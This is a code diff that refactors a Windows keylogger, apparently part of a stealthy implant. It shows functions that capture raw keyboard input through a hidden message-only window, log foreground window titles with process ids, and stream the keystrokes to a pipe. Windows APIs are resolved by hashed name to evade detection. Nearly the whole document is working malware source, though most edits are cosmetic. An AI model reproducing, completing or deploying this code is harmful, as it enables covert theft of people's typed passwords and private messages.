@@ -45,8 +45,8 @@ auto DECLFN KeyloggerInstall(
     }
 
     // Register a Window class
-    WNDCLASSEX WinClass = { 0 };
-    WinClass.cbSize        = sizeof(WinClass);
+    WNDCLASSEXW WinClass = { 0 };
+    WinClass.cbSize        = sizeof(WNDCLASSEXW);
     WinClass.lpfnWndProc   = WndCallback;            // process WM_INPUT messages
     WinClass.hInstance     = Instance->Win32.GetModuleHandleA(NULL);
     WinClass.lpszClassName = KEYLOG_CLASS_NAME;
@@ -57,7 +57,7 @@ auto DECLFN KeyloggerInstall(
         return  KeyloggerCleanup();
     }
     
-    WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+    HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
     if(! WindowHandle)
     {
         return KeyloggerCleanup();
@@ -101,12 +101,14 @@ auto DECLFN KeyloggerInstall(
     return KeyloggerCleanup();
 }
 
-static LRESULT CALLBACK WndCallback(
+auto DECLFN CALLBACK WndCallback(
     _In_ HWND   Window,
     _In_ UINT   Message,
     _In_ WPARAM WParam,
     _In_ LPARAM LParam
-) {
+) -> LRESULT {
+    G_INSTANCE
+
     UINT      Length = 0;
     PRAWINPUT RawInput = NULL;
 
@@ -153,7 +155,9 @@ WCHAR g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
 
 VOID ProcessWindowTitle()
 {
-    WCHAR Buffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
+    G_INSTANCE
+
+        WCHAR Buffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
     WCHAR Title[KEYLOG_BUFFER_LEN + 1] = { 0 };
     DWORD ProcessId = { 0 };
     HWND  CurrentWindow = { 0 };
@@ -163,28 +167,34 @@ VOID ProcessWindowTitle()
     Instance->Win32.RtlSecureZeroMemory(Title, sizeof(Title));
 
     // get current foreground/active window title
-    if ((CurrentWindow = Instance->Win32.GetForegroundWindow())) 
+    if ((CurrentWindow = Instance->Win32.GetForegroundWindow()))
     {
         // get the window title name and the associated process id 
         Instance->Win32.GetWindowThreadProcessId(CurrentWindow, &ProcessId);
-        if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer))) {
+        if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer)))
+        {
             swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
         }
 
         // check when ever the title has been changed.
-        if (wcsncmp(g_TitleBuffer, Buffer, wcslen(Buffer)) != 0) {
+        if (wcsncmp(g_TitleBuffer, Buffer, wcslen(Buffer)) != 0)
+        {
             memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));
 
             swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
 
-            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL)) {
-                return 1;
+            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
+            {
+                return;
+            }
         }
     }
 }
 
 VOID ProcessKey(UINT Key)
 {
+    G_INSTANCE 
+
     WCHAR Unicode[2]                  = { 0 };
     BYTE  Keyboard[256]               = { 0 };
     WCHAR Buffer[KEYLOG_BUFFER_LEN+1] = { 0 };
@@ -210,34 +220,34 @@ VOID ProcessKey(UINT Key)
             swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
             break;
 
-    case VK_RETURN:
-        swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
-        break;
+        case VK_RETURN:
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
+            break;
 
-    case VK_BACK:
-        swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
-        break;
+        case VK_BACK:
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
+            break;
 
-    case VK_TAB:
-        swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
-        break;
+        case VK_TAB:
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
+            break;
 
-    case VK_SPACE:
-        swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
-        break;
+        case VK_SPACE:
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
+            break;
         
-    default:
-        if (Instance->Win32.ToUnicode(Key, Instance->Win32.MapVirtualKeyW(Key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0) {
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
-        }
+        default:
+            if (Instance->Win32.ToUnicode(Key, Instance->Win32.MapVirtualKeyW(Key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0)
+            {
+                swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
+            }
     }
 
-    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) {
-        return 1;
+    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) 
+    {
+        return;
     }
 }
-
-
 
 auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
     G_INSTANCE
@@ -325,6 +335,7 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.MapVirtualKeyW = (decltype(Instance->Win32.MapVirtualKeyW))LoadApi(User32, HashStr("MapVirtualKeyW"));
 
     Instance->Win32.HeapAlloc = (decltype(Instance->Win32.HeapAlloc))LoadApi(Kernel32, HashStr("HeapAlloc"));
+    Instance->Win32.HeapFree = (decltype(Instance->Win32.HeapFree))LoadApi(Kernel32, HashStr("HeapFree"));
     Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));
 
     Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Kernel32, HashStr("RtlZeroMemory"));
